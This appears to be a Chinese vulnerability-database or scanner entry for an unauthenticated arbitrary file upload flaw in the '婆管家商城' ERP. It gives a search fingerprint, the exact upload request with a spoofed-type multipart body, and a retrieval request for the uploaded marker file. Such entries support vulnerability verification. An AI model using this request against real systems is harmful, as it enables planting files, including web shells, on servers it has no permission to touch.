# 婆管家商城ERPuploadimgnocheck存在任意文件上传漏洞

- **系统**：婆管家商城　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/Utility/JSHeadJump.js"`
- **请求**：`POST /api/Upload/UploadImgNoCheck?m_server_name=ShopUserImg HTTP/1.1`
- **关键头**：`Content-Length: 226`　`Content-Type: multipart/form-data; boundary=---------------------------58n…`

**请求体 / payload**
```
-----------------------------58nlgtjoht3z43rf5hn3
Content-Disposition: form-data; name="Filedata"; filename="bpor8tnhz9.txt"
Content-Type: image/jpeg
GIF89a
12345678
-----------------------------58nlgtjoht3z43rf5hn3--
GET /Storage/UserFileImg/566ef80c6194469f9388847c1b14a6e2.txt HTTP/1.1
Host:
Range: bytes=0-100
```
- **预期**：200　|　—